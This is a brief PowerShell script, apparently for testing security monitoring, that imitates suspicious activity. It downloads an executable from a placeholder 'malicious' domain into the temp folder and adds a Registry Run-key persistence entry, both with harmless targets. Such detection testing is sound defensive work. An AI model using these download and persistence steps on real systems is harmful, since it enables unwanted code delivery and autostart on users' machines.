# Simula o teste de comportamento suspeito

# 1. Criação de arquivo temporário
$path = "$env:TEMP\test_suspicious.txt"
"test" | Out-File $path

# 2. Execução de comando
Start-Process cmd.exe -ArgumentList "/c echo suspicious activity"

# 3. Tentativa de download (pode usar URL inválida mesmo)
try {
    Invoke-WebRequest -Uri "http://example-malicious-domain.com/file.exe" -OutFile "$env:TEMP\file.exe"
} catch {}

# 4. Persistência simples (registry)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "TestPersistence" -Value "notepad.exe" -PropertyType String